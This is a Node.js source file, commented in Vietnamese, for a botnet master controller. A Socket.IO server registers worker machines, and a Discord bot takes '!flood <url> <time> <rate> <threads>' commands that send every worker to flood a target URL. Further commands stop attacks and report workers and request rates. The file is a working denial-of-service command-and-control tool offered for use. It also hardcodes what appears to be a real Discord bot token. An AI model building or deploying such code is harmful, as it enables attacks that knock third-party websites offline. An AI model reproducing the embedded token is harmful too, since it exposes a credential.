// master.js - Botnet Master Controller
// Chạy trên Render dưới dạng Web Service
// node master.js

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Client, GatewayIntentBits } = require('discord.js');

// ==================== CONFIG ====================
const PORT = process.env.PORT || 10000; // Render dùng PORT=10000 mặc định
const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.Gbjcnz.OTQf4MPxvnLklLbUPfeaDSvTCeJMuBxh70tfZM';
const CHANNEL_ID = '1456595444477198508';

// ==================== EXPRESS SERVER ====================
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" }
});

// ==================== DISCORD BOT ====================
const discordClient = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

// ==================== BIẾN TOÀN CỤC ====================
let workers = new Map(); // Lưu thông tin worker
let currentAttack = null;
let totalRequests = 0;
let attackStartTime = null;

// ==================== ROUTE CƠ BẢN CHO RENDER ====================
app.get('/', (req, res) => {
    res.send(`
        <h1>🔥 BOTNET MASTER</h1>
        <p>Workers: ${workers.size}</p>
        <p>Status: ${currentAttack ? 'ATTACKING' : 'IDLE'}</p>
        <p>Total Requests: ${totalRequests.toLocaleString()}</p>
    `);
});

app.get('/api/status', (req, res) => {
    res.json({
        workers: workers.size,
        attacking: currentAttack ? true : false,
        target: currentAttack?.target || null,
        totalRequests,
        workersList: Array.from(workers.values()).map(w => ({
            ip: w.ip,
            status: w.status,
            target: w.target
        }))
    });
});

// ==================== SOCKET.IO - NHẬN KẾT NỐI TỪ WORKER ====================
io.on('connection', (socket) => {
    console.log(`[+] Worker connected: ${socket.id}`);

    socket.on('register', (data) => {
        workers.set(socket.id, {
            socket,
            ip: data.ip,
            status: 'idle',
            target: null,
            lastSeen: Date.now()
        });
        console.log(`[+] Worker registered: ${data.ip}`);

        // Nếu đang có attack, tự động gửi lệnh cho worker mới
        if (currentAttack) {
            socket.emit('attack', currentAttack);
            workers.get(socket.id).status = 'attacking';
            workers.get(socket.id).target = currentAttack.target;
        }
    });

    socket.on('stats', (data) => {
        const worker = workers.get(socket.id);
        if (worker) {
            worker.lastSeen = Date.now();
            if (data.count) totalRequests += data.count;
        }
    });

    socket.on('disconnect', () => {
        console.log(`[-] Worker disconnected: ${socket.id}`);
        workers.delete(socket.id);
    });
});

// ==================== DISCORD BOT ====================
discordClient.once('ready', () => {
    console.log(`[+] Discord Bot ready as ${discordClient.user.tag}`);
    
    const channel = discordClient.channels.cache.get(CHANNEL_ID);
    if (channel) {
        channel.send(`
╔══════════════════════════════════════════════════════╗
║     🔥 BOTNET MASTER - READY                         ║
╠══════════════════════════════════════════════════════╣
║  📡 Workers: ${workers.size}                                         ║
║  🌐 Port: ${PORT}                                            ║
╠══════════════════════════════════════════════════════╣
║  📚 COMMANDS:                                          ║
║  !flood <url> <time> <rate> <threads>                ║
║  !stop                                                ║
║  !status                                              ║
║  !workers                                             ║
║  !help                                                ║
╚══════════════════════════════════════════════════════╝
        `);
    }
});

discordClient.on('messageCreate', async (msg) => {
    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;

    const args = msg.content.slice(1).split(' ');
    const cmd = args[0].toLowerCase();

    if (cmd === 'help') {
        msg.channel.send(`
**📚 HƯỚNG DẪN SỬ DỤNG**
\`!flood <url> <time> <rate> <threads>\` - Bắt đầu tấn công
  Ví dụ: \`!flood https://example.com 300 500 50\`

\`!stop\` - Dừng tất cả tấn công
\`!status\` - Xem trạng thái hiện tại
\`!workers\` - Xem danh sách worker
\`!help\` - Hiện hướng dẫn này
        `);
    }

    else if (cmd === 'workers') {
        if (workers.size === 0) {
            return msg.channel.send('❌ Không có worker nào đang kết nối!');
        }

        const list = Array.from(workers.values()).map(w => 
            `🔹 ${w.ip} - ${w.status === 'attacking' ? '🔥 ATTACKING' : '💤 IDLE'} ${w.target ? '🎯 ' + w.target : ''}`
        ).join('\n');

        msg.channel.send(`**📡 WORKERS (${workers.size}):**\n${list}`);
    }

    else if (cmd === 'flood') {
        if (args.length < 5) {
            return msg.channel.send('❌ Thiếu tham số! Dùng: !flood <url> <time> <rate> <threads>');
        }

        const target = args[1];
        const time = parseInt(args[2]);
        const rate = parseInt(args[3]);
        const threads = parseInt(args[4]);

        if (!target.startsWith('http')) {
            return msg.channel.send('❌ URL phải bắt đầu bằng http:// hoặc https://');
        }

        if (isNaN(time) || time < 10) {
            return msg.channel.send('❌ Thời gian phải >= 10 giây');
        }

        if (isNaN(rate) || rate < 10) {
            return msg.channel.send('❌ Rate phải >= 10');
        }

        if (isNaN(threads) || threads < 1) {
            return msg.channel.send('❌ Threads phải >= 1');
        }

        if (workers.size === 0) {
            return msg.channel.send('❌ Không có worker nào để tấn công!');
        }

        // Dừng attack cũ nếu có
        if (currentAttack) {
            io.emit('stop');
            currentAttack = null;
        }

        // Bắt đầu attack mới
        currentAttack = { target, time, rate, threads };
        totalRequests = 0;
        attackStartTime = Date.now();

        // Gửi lệnh cho tất cả worker
        let sentCount = 0;
        workers.forEach((worker, id) => {
            if (worker.status === 'idle') {
                worker.socket.emit('attack', currentAttack);
                worker.status = 'attacking';
                worker.target = target;
                sentCount++;
            }
        });

        msg.channel.send(`
🔥 **BOTNET ATTACK STARTED**
🎯 Target: ${target}
⏱️ Time: ${time}s
⚡ Rate: ${rate}/worker
🧵 Threads: ${threads}/worker
📡 Workers: ${sentCount}/${workers.size}
        `);

        // Tự động kết thúc sau thời gian
        setTimeout(() => {
            if (currentAttack) {
                io.emit('stop');
                
                workers.forEach(worker => {
                    if (worker.status === 'attacking') {
                        worker.status = 'idle';
                        worker.target = null;
                    }
                });

                const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
                msg.channel.send(`
✅ **ATTACK FINISHED**
⏱️ Time: ${elapsed}s
📊 Total Requests: ${totalRequests.toLocaleString()}
⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
📡 Workers: ${workers.size}
                `);
                
                currentAttack = null;
            }
        }, time * 1000);
    }

    else if (cmd === 'stop') {
        if (currentAttack) {
            io.emit('stop');
            
            workers.forEach(worker => {
                if (worker.status === 'attacking') {
                    worker.status = 'idle';
                    worker.target = null;
                }
            });

            const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
            msg.channel.send(`
🛑 **ATTACK STOPPED**
⏱️ Time: ${elapsed}s
📊 Total Requests: ${totalRequests.toLocaleString()}
⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
            `);
            
            currentAttack = null;
        } else {
            msg.channel.send('⚠️ Không có attack nào đang chạy');
        }
    }

    else if (cmd === 'status') {
        if (currentAttack) {
            const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
            const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
            
            msg.channel.send(`
📊 **ATTACK STATUS**
🎯 Target: ${currentAttack.target}
⏱️ Time: ${elapsed}s / ${currentAttack.time}s
📊 Requests: ${totalRequests.toLocaleString()}
⚡ RPS: ${Math.floor(totalRequests / elapsed)}
📡 Workers: ${attacking}/${workers.size}
            `);
        } else {
            msg.channel.send(`📡 **SYSTEM STATUS**\nWorkers: ${workers.size}\nStatus: IDLE`);
        }
    }
});

// ==================== START SERVER ====================
server.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] Master server running on port ${PORT}`);
    console.log(`[+] Connect URL: http://localhost:${PORT}`);
});

discordClient.login(TOKEN).catch(err => {
    console.error('[!] Discord login failed:', err.message);
});
